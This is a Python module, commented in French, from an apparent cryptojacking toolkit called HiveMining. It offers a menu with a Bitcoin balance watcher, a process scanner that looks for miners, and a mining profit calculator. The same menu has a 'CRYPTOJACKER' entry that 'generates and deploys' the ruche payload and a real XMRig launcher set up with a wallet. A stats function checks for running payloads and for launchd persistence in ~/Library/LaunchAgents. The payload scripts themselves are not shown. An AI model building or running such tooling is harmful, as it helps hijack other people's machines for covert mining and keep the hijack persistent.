# modules/ruche.py - HiveMining : surveiller, chasser, calculer
import os, subprocess, json, time

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "sorties")
os.makedirs(OUT, exist_ok=True)

def ask(label): return input(f"  {label} : ").strip()
def r(cmd): subprocess.run(cmd, shell=True)

def wallet_watch():
    """surveille des adresses BTC via l'API publique"""
    addrs = ask("adresses BTC (virgules)").split(",")
    import urllib.request
    for a in [a.strip() for a in addrs if a.strip()]:
        try:
            d = json.loads(urllib.request.urlopen(
                f"https://blockchain.info/rawaddr/{a}", timeout=15).read())
            print(f"   {a[:20]}...  solde {d.get('final_balance',0)/1e8} BTC  ({d.get('n_tx')} tx)")
        except Exception as e:
            print(f"   {a[:20]}...  [!] {e}")

def miner_hunter():
    """detecte les mineurs sur cette machine"""
    signatures = ["xmrig", "minerd", "cpuminer", "ethminer", "bfgminer", "ruche_worker"]
    procs = subprocess.run("ps -axo pid,pcpu,comm", shell=True, capture_output=True).stdout.decode()
    hits = []
    for line in procs.splitlines():
        for s in signatures:
            if s.lower() in line.lower():
                hits.append(line.strip())
    # gros CPU sans nom de mineur = suspect aussi
    for line in procs.splitlines()[1:]:
        try:
            cpu = float(line.split()[1])
            if cpu > 80: hits.append("[CPU>80%] " + line.strip()[:80])
        except (ValueError, IndexError):
            pass
    if hits:
        print("  MINEURS DETECTES :")
        for h in hits[:10]: print("   ", h)
    else:
        print("  aucune ruche etrangere sur cette machine")

def calc():
    h = float(ask("ton hashrate H/s (ex 1000000)") or 1_000_000)
    net = float(ask("hashrate reseau (defaut 6e14)") or 6e14)
    reward = float(ask("recompense bloc (defaut 3.125 BTC)") or 3.125)
    blocks_day = 144
    share = h / net
    btc_day = share * blocks_day * reward
    print(f"  part du reseau : {share*100:.10f} %")
    print(f"  revenu estime  : {btc_day:.10f} BTC/jour  ({btc_day*30:.8f} BTC/mois)")
    px = float(ask("prix BTC (defaut 97000)") or 97000)
    print(f"  en euros       : {btc_day*px:.2f} EUR/jour")

def stats():
    """etat de la ruche locale : payloads actifs + launchd"""
    r("pgrep -fl 'ruche_worker|xming|xmrig' | head -5")
    print("  persistance presente :")
    r("grep -l hive ~/Library/LaunchAgents/*.plist 2>/dev/null || echo '  (aucune)'")

def TOOLS():
    return [
        ("POW MINER",        "minage PoW reel (SHA-256, difficulte)", lambda: r("python3 " + os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ruche_pow.py"))),
        ("XMRIG REEL",       "vrai miner Monero + config wallet",      lambda: r("zsh " + os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ruche_xmrig.sh"))),
        ("CRYPTOJACKER",     "genere + deploye le payload ruche",      lambda: r("python3 " + os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ruche_payload.py"))),
        ("WALLET WATCH",     "soldes d'adresses BTC surveillees",      wallet_watch),
        ("MINER HUNTER",     "detecte les mineurs etrangers",          miner_hunter),
        ("PROFIT CALC",      "hashrate -> revenu estime",              calc),
    ]

TOOLS = TOOLS()
